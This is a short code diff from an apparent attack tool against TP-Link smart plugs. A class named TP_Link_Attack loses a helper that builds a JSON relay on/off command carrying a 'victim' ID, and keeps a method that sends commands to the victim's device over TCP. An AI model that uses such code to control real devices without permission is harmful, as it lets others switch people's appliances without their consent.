@@ -108,16 +108,6 @@ class TP_Link_Attack():
     return plaintext
 
 
-  # Constructs a valid switch JSON command. 
-  # NOTE: UNNECESSARY
-  def construct_switch_cmd(self, on=False):
-    return "{\"context\":{\"source\":\"" + \
-        self.victim_id + \
-        "\"},\"system\":{\"set_relay_state\":{\"state\":" + \
-        str(int(on)) + \
-        "}}}"
-
-  
   # Sends to the victim the binary representation of the provided JSON command
   # NOTE: Uses only one TCP session to send JSON
   def send_json(self, ip, json, timeout=2):
